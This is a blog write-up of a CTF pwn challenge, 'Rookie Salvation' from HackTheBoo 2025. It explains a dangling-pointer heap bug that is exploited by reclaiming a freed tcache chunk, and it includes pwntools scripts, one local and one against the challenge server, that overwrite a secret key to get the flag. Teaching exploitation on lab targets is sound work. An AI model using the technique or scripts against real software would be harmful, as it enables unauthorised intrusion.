<!DOCTYPE html>
<html><head lang="en">
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>HackTheBoo CTF 2025 | Pwn: Rookie Salvation [medium] - moeve&#39;s blog</title><link rel="icon" type="image/x-icon" href="/favicon2.8f68632c487952c29fd770f908f1910c2adc7ffbb78ffd0c71771bca8c5b71e1.ico" /><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Reclaiming a freed heap chunk via tcache to rewrite the secret key and unlock the salvation path for the flag." />
	<meta property="og:image" content=""/>
	<script>
	(function () {
		var storageKey = 'theme';
		var classList = document.documentElement.classList;
		var storedTheme = null;
		try {
			storedTheme = window.localStorage.getItem(storageKey);
		} catch (err) {
			storedTheme = null;
		}
		var prefersDark = false;
		try {
			prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
		} catch (err) {
			prefersDark = false;
		}
		var theme = (storedTheme === 'dark' || storedTheme === 'light') ? storedTheme : (prefersDark ? 'dark' : 'light');
		if (theme === 'dark') {
			classList.add('dark');
		} else {
			classList.remove('dark');
		}
	})();
	</script>
	<script type="module" src="https://diemoeve.github.io/js/theme-toggle.js" defer></script>
	<meta property="og:url" content="https://diemoeve.github.io/writeups/writeups/hacktheboo-ctf-2025-pwn-rookie-salvation-medium/">
  <meta property="og:site_name" content="moeve&#39;s blog">
  <meta property="og:title" content="HackTheBoo CTF 2025 | Pwn: Rookie Salvation [medium]">
  <meta property="og:description" content="Reclaiming a freed heap chunk via tcache to rewrite the secret key and unlock the salvation path for the flag.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="writeups">
    <meta property="article:published_time" content="2025-10-27T00:00:00+00:00">
    <meta property="article:modified_time" content="2025-10-27T00:00:00+00:00">
    <meta property="article:tag" content="HackTheBox">
    <meta property="article:tag" content="HackTheBoo 2025">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Heap Exploitation">
    <meta property="article:tag" content="X86_64">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="HackTheBoo CTF 2025 | Pwn: Rookie Salvation [medium]">
  <meta name="twitter:description" content="Reclaiming a freed heap chunk via tcache to rewrite the secret key and unlock the salvation path for the flag.">

        <link href="https://diemoeve.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="https://diemoeve.github.io/css/main.7a5c05040394322612a2d98397e9932aa81d9d7acc70199463e79f8180c8e0c0.css" />
		
		
		<link rel="stylesheet" type="text/css" href="https://diemoeve.github.io/css/custom.07f912777db42e88a413bca7f38a722b56303b2914ca91d86ae3341cccc44ed5.css">
		
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="https://diemoeve.github.io/">moeve&#39;s blog</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/writeups/">Writeups</a>
		
		<a href="/tags/">Tags</a>
		
		<button id="theme-toggle" class="theme-toggle" type="button" aria-label="Switch to dark mode" aria-pressed="false">
			<svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
				<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
			</svg>
			<svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
				<circle cx="12" cy="12" r="5"></circle>
				<line x1="12" y1="1" x2="12" y2="3"></line>
				<line x1="12" y1="21" x2="12" y2="23"></line>
				<line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
				<line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
				<line x1="1" y1="12" x2="3" y2="12"></line>
				<line x1="21" y1="12" x2="23" y2="12"></line>
				<line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
				<line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
			</svg>
		</button>
	</nav>
</header>

<main>
  <article>
    <div class="post-container">
      
      <div class="post-content">
        <div class="title">
          <h1 class="title">HackTheBoo CTF 2025 | Pwn: Rookie Salvation [medium]</h1>
          <div class="meta">Posted on Oct 27, 2025</div>
        </div>
        
        <section class="body">
          <p>Rook’s last stand against NEMEGHAST begins now. This is no longer a simulation—it’s the collapse of control. Legend speaks of only one entity who ever broke free from the Matrix: the original architect of NEMEGHAST. His name—buried, forbidden, encrypted—was the master key. If you can recover it… and inject it into the core&hellip; Rook will finally be free.</p>
<h2 id="step-1-explore-the-challenge-files">Step 1: Explore the Challenge Files</h2>
<pre tabindex="0"><code>ls
file rookie_salvation
cat README.txt
</code></pre><p>Findings:</p>
<ul>
<li>Only one ELF (<code>rookie_salvation</code>) plus flavor text.</li>
<li>64-bit dynamically linked PIE, NX and stack canary enabled, so a classic ret2win is unlikely.</li>
</ul>
<h2 id="step-2-baseline-protections-and-ux">Step 2: Baseline Protections and UX</h2>
<pre tabindex="0"><code>checksec --file=rookie_salvation
./rookie_salvation
</code></pre><p><code>checksec</code> confirms <strong>Full RELRO</strong>, <strong>Canary</strong>, <strong>NX</strong>, <strong>PIE</strong>. Running the binary shows the three-option:</p>
<pre tabindex="0"><code>+-------------------+
| [1] Reserve space |
| [2] Obliterate    |
| [3] Escape        |
+-------------------+
</code></pre><p>Option 3 invokes the salvation check, so the vulnerability must involve options 1 and 2.</p>
<h2 id="step-3-static-reconnaissance">Step 3: Static Reconnaissance</h2>
<p>Enumerate symbols and dive into the interesting functions with radare2.</p>
<pre tabindex="0"><code>nm -C rookie_salvation
r2 -q -c &#39;aaa; e scr.color=false; s sym.reserve_space; pdf&#39; rookie_salvation
r2 -q -c &#39;aaa; e scr.color=false; s sym.obliterate; pdf&#39; rookie_salvation
r2 -q -c &#39;aaa; e scr.color=false; s sym.road_to_salvation; pdf&#39; rookie_salvation
</code></pre><p>Key observations:</p>
<ul>
<li><code>main</code> allocates a single heap chunk (<code>malloc(0x26)</code>) and stores its pointer in the global <code>allocated_space</code>. The bytes at <code>allocated_space + 0x1e</code> are initialized to the string <code>&quot;deadbeef&quot;</code>.</li>
<li><strong>reserve_space</strong>
<ul>
<li>Prompts for a size, <code>malloc</code>s that size, and lets us <code>scanf(&quot;%s&quot;)</code> directly into the new chunk.</li>
<li>Never updates the global <code>allocated_space</code>; it only stores the pointer in a local variable.</li>
</ul>
</li>
<li><strong>obliterate</strong> calls <code>free(allocated_space)</code> without nulling the pointer.</li>
<li><strong>road_to_salvation</strong> compares <code>strcmp((char*)(allocated_space+0x1e), &quot;w3th4nds&quot;)</code>. If it matches, the function opens <code>flag.txt</code>; otherwise loop back to menu.</li>
</ul>
<p>This sets up a <strong>dangling pointer</strong>: after <code>obliterate</code>, the global pointer remains, but the chunk returns to the tcache and can be reclaimed via <code>reserve_space</code>.</p>
<h2 id="step-4-exploitation-strategy">Step 4: Exploitation Strategy</h2>
<ol>
<li><strong>Obliterate</strong> the original chunk so it enters the tcache bin for size 0x30.</li>
<li><strong>Reserve</strong> a new chunk of a compatible size (decimal 40 in the menu suffices – glibc rounds to the same 0x30 size class).</li>
<li>Because the freed chunk is first in the tcache list, the new allocation reuses the exact same address still stored in <code>allocated_space</code>.</li>
<li>When we input data for the new chunk, we overwrite the bytes at offset <code>0x1e</code>, effectively rewriting the salvation key that <code>road_to_salvation</code> will later verify.</li>
<li>Trigger option 3 to read the flag.</li>
</ol>
<h2 id="step-5-local-proof-of-concept">Step 5: Local Proof of Concept</h2>
<p>Use pwntools to script the menu sequence and confirm that replacing the secret with <code>w3th4nds</code> prints the local fake flag.</p>
<pre tabindex="0"><code>from pwn import *
context.log_level = &#39;debug&#39;
elf = ELF(&#39;./rookie_salvation&#39;, checksec=False)

io = process(elf.path)
io.recvuntil(b&#39;&gt; &#39;)
io.sendline(b&#39;2&#39;)
io.recvuntil(b&#39;&gt; &#39;)
io.sendline(b&#39;1&#39;)
io.recvuntil(b&#39;: &#39;)
io.sendline(b&#39;40&#39;)
io.recvuntil(b&#39;: &#39;)
io.sendline(b&#39;A&#39;*30 + b&#39;w3th4nds&#39;)
io.recvuntil(b&#39;&gt; &#39;)
io.sendline(b&#39;3&#39;)
print(io.recvrepeat(1).decode())
io.close()
</code></pre><p>Output:</p>
<pre tabindex="0"><code>[Unknown Voice] ✨ 𝐅𝐢𝐧𝐚𝐥𝐥𝐲.. 𝐓𝐡𝐞 𝐰𝐚𝐲.. 𝐎𝐮𝐭..HHTB{f4k3_fl4g_4_t35t1ng}
</code></pre><p>The local binary with a dummy flag, confirming that the logic works.</p>
<h2 id="step-6-exploit">Step 6: Exploit</h2>
<pre tabindex="0"><code>from pwn import *

context.binary = ELF(&#34;./rookie_salvation&#34;, checksec=False)
context.log_level = &#34;info&#34;

HOST = &#34;209.38.254.18&#34;
PORT = 31337


def forge_key(io):
    io.sendlineafter(b&#34;&gt; &#34;, b&#34;2&#34;)
    io.sendlineafter(b&#34;&gt; &#34;, b&#34;1&#34;)
    io.sendlineafter(b&#34;: &#34;, b&#34;40&#34;)
    payload = b&#34;A&#34; * 0x1E + b&#34;w3th4nds&#34;
    io.sendlineafter(b&#34;: &#34;, payload)
    io.sendlineafter(b&#34;&gt; &#34;, b&#34;3&#34;)
    io.recvuntil(b&#34;HTB{&#34;)
    flag = b&#34;HTB{&#34; + io.recvuntil(b&#34;}&#34;)
    log.success(flag.decode())


def main():
    io = remote(HOST, PORT)
    forge_key(io)


if __name__ == &#34;__main__&#34;:
    main()
</code></pre><p>Run the script</p>
<pre tabindex="0"><code>python3 exploit.py
</code></pre><pre tabindex="0"><code>[+] Opening connection to 209.38.254.18 on port 31337: Done
[+] HTB{h34p_2_h34v3n}
[*] Closed connection to 209.38.254.18 port 31337
</code></pre>
        </section>
        <div class="post-tags">
          
          
          <nav class="nav tags">
            <ul class="tags">
              
              <li><a href="/tags/hackthebox">HackTheBox</a></li>
              
              <li><a href="/tags/hacktheboo-2025">HackTheBoo 2025</a></li>
              
              <li><a href="/tags/pwn">Pwn</a></li>
              
              <li><a href="/tags/heap-exploitation">Heap Exploitation</a></li>
              
              <li><a href="/tags/x86_64">x86_64</a></li>
              
            </ul>
          </nav>
          
          
        </div>
      </div>

      
      
    </div>

    </article>
</main>
<footer>
  <div style="display:flex"></div>
  <div class="footer-info">
    © 2025 moeve · Theme based on <a href="https://github.com/athul/archie">Archie</a> (MIT)
  </div>
</footer>



</div>
    </body>
</html>
